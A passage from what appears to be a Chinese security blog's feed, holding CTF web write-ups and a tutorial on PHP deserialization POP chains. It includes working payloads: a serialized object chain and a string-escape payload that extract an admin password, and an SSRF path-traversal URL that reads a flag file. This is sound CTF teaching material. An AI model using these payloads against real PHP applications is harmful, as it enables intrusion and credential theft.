class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//还没来得及写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$newInfo,$sql</span>)</span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这里如果sql为类的话就会调用user的__string()函数</span></span><br></pre></td></tr></table></figure><blockquote><p>pop 链思路 ：利用 UpdateHelper类的__destruct函数触发User类的__tostring函数再触发Info类的__call()函数</p><p>把 $this-&gt;CtrlCase实例化dbctrl 对象，再调用dbctrl类的login函数，通过查询语句把admin账户的密码查出来</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//payload</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname = <span class="literal">null</span>;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$age,$nickname</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname = $nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$newInfo,$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $newInfo = unserialize($newInfo);</span><br><span class="line">        $upDate = <span class="keyword">new</span> dbCtrl();        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token = <span class="string">&quot;admin&quot;</span>;    </span><br><span class="line">&#125;</span><br><span class="line">$db = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">$user = <span class="keyword">new</span> User();</span><br><span class="line">$info = <span class="keyword">new</span> Info(<span class="string">&quot;lcdm123&quot;</span>,<span class="string">&quot;lcdm123&quot;</span>);</span><br><span class="line">$updatehelper = <span class="keyword">new</span> UpdateHelper(<span class="string">&quot;lcdm123&quot;</span>,<span class="string">&quot;lcdm123&quot;</span>);</span><br><span class="line"></span><br><span class="line">$info-&gt;CtrlCase = $db;</span><br><span class="line">$user-&gt;nickname = $info;</span><br><span class="line">$user-&gt;age = <span class="string">&quot;select password,id from user where username=?&quot;</span>;</span><br><span class="line">$updatehelper-&gt;sql = $user;</span><br><span class="line"></span><br><span class="line">$realinfo = <span class="keyword">new</span> Info(<span class="string">&quot;lcdm123&quot;</span>,<span class="string">&quot;lcdm123&quot;</span>);</span><br><span class="line">$realinfo-&gt;CtrlCase = $updatehelper;</span><br><span class="line"><span class="keyword">echo</span> serialize($realinfo);</span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:7:&quot;lcdm123&quot;;s:8:&quot;nickname&quot;;s:7:&quot;lcdm123&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:7:&quot;lcdm123&quot;;s:8:&quot;nickname&quot;;s:7:&quot;lcdm123&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/12/19/N5rC6EoHx9bgWtO.png" alt="image-20201219174513688"></p><p><img src="https://i.loli.net/2020/12/19/zlhwvqRcAB9p2xX.png" alt="image-20201219175110353"></p><p>最终payload</p><p><a href="http://lcdm123.top/2020/11/30/Unctf-WEB/">序列化逃逸</a></p><blockquote><p>这样构造的原因：将之前的序列化字符串删除info的部分（因为传入参数时会自动构造info），添加（”;s:8:”CtrlCase”;）的原因是因为传入参数的时候没有CtrlCase参数，需要自己提前构造好利用php反序列化字符串逃逸的方法传入</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;unionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:7:&quot;lcdm123&quot;;s:8:&quot;nickname&quot;;s:7:&quot;lcdm123&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>传入payload，获取到密码的payload（需要手动删除后面的0-0）</p><p><img src="https://i.loli.net/2020/12/19/PphKnBU5Oof7NzD.png" alt="image-20201219181053512"></p><p>获得密码</p><p><img src="https://i.loli.net/2020/12/19/YhBUPJtlczQ8ewE.png" alt="image-20201219160536309"></p><p>登录获取flag</p><p><img src="https://i.loli.net/2020/12/19/PbarExg3MjSnufL.png" alt="image-20201219160523133"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;考点：php序列化pop链   序列化字符串逃逸&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;打开题目按照管理先扫描目录&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;使用dirsearch 扫描出来了  flag.php  login.php&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化POP链构造</title>
    <link href="http://example.com/2020/12/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE%E6%9E%84%E9%80%A0/"/>
    <id>http://example.com/2020/12/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE%E6%9E%84%E9%80%A0/</id>
    <published>2020-12-21T15:20:59.000Z</published>
    <updated>2020-12-22T11:45:14.972Z</updated>
    
    <content type="html"><![CDATA[<h2 id="构造PHP反序列化pop链"><a href="#构造PHP反序列化pop链" class="headerlink" title="构造PHP反序列化pop链"></a>构造PHP反序列化pop链</h2><blockquote><p>以前理解的序列化攻击更多是在魔术方法中出现的一些利用漏洞，因为自动调用从而触发的漏洞。**<em>但是如果关键代码不在魔术方法中**</em>，而在一个类的普通方法中，这时候需要找相同的函数名将类的属性与敏感函数的属性联系起来</p></blockquote><a id="more"></a><h3 id="常见的php魔法函数"><a href="#常见的php魔法函数" class="headerlink" title="常见的php魔法函数"></a>常见的php魔法函数</h3><blockquote><p> 构造pop链的关键</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__construct()  当一个对象创建时被调用</span><br><span class="line">__destruct()   当一个对象被销毁时调用</span><br><span class="line">__weakup()     使用unserialize时触发</span><br><span class="line">__sleep()      使用serialize时触发</span><br><span class="line">__call()       在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__get()        从不可访问的属性读取数据</span><br><span class="line">__set()        将数据写入不可访问的属性</span><br><span class="line">__toString()   把类当成字符串使用时触发</span><br><span class="line">__invoke()     当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><p><strong><em>构造pop链，首先要找到头和尾（用户传入参数的地方与最终要执行函数的地方），从头到尾进行反推</em></strong></p><h3 id="简单实例"><a href="#简单实例" class="headerlink" title="简单实例"></a>简单实例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span></span>&#123;</span><br><span class="line">    pubilc $a;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;a = <span class="keyword">new</span> test2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;a))</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;a-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test3</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cmd</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize($_GET[<span class="string">&#x27;d&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>这是一个简单的例子，通过test::__string() –&gt; test3::__action() 来构造pop链</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 构造pop链</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="keyword">new</span> test3; </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test3</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cmd = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$b = <span class="keyword">new</span> test1;</span><br><span class="line"><span class="keyword">echo</span> serialize($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>对于protect 与 private 序列化后 需要添加 %00</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;构造PHP反序列化pop链&quot;&gt;&lt;a href=&quot;#构造PHP反序列化pop链&quot; class=&quot;headerlink&quot; title=&quot;构造PHP反序列化pop链&quot;&gt;&lt;/a&gt;构造PHP反序列化pop链&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;以前理解的序列化攻击更多是在魔术方法中出现的一些利用漏洞，因为自动调用从而触发的漏洞。**&lt;em&gt;但是如果关键代码不在魔术方法中**&lt;/em&gt;，而在一个类的普通方法中，这时候需要找相同的函数名将类的属性与敏感函数的属性联系起来&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Unctf-WEB</title>
    <link href="http://example.com/2020/11/30/Unctf-WEB/"/>
    <id>http://example.com/2020/11/30/Unctf-WEB/</id>
    <published>2020-11-30T14:03:36.000Z</published>
    <updated>2020-12-22T11:42:43.147Z</updated>
    
    <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>[TOC]</p><a id="more"></a><h3 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">&#x27;&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/unctf\.com/&#x27;</span>,$url))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/php|file|zip|bzip|zlib|base|data/i&#x27;</span>,$url))&#123;</span><br><span class="line">        $url=file_get_contents($url);</span><br><span class="line">        <span class="keyword">echo</span>($url);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;error!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>SSRF   返回上级目录，读取文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?url&#x3D;unctf.com&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/07/GZqdMIHzobl61PX.png" alt="image-20201107151749234"></p><h3 id="easyunserializ"><a href="#easyunserializ" class="headerlink" title="easyunserializ"></a>easyunserializ</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $uname;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$uname,$password</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uname=$uname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">&#x27;easy&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                <span class="keyword">echo</span> $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;wrong password&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;challenge&#x27;</span>,<span class="string">&#x27;easychallenge&#x27;</span>,$string);</span><br><span class="line">&#125; <span class="comment"># 改变序列化中的字符</span></span><br><span class="line"></span><br><span class="line">$uname=$_GET[<span class="number">1</span>];</span><br><span class="line">$password=<span class="number">1</span>;</span><br><span class="line">$ser=filter(serialize(<span class="keyword">new</span> a($uname,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="php反序列化字符串逃逸"><a href="#php反序列化字符串逃逸" class="headerlink" title="php反序列化字符串逃逸"></a>php反序列化字符串逃逸</h5><ul><li>序列化的特点：以 ; 为字段的分隔，以 } 为结尾，并且根据长度判断内容</li><li>超出部分不会被反序列化成功，说明反序列化的过程是有一定的识别范围的，范围之外都会被自动忽略</li><li>反序列化时长度不对应会报错</li><li>可以反序列化不存在的元素</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 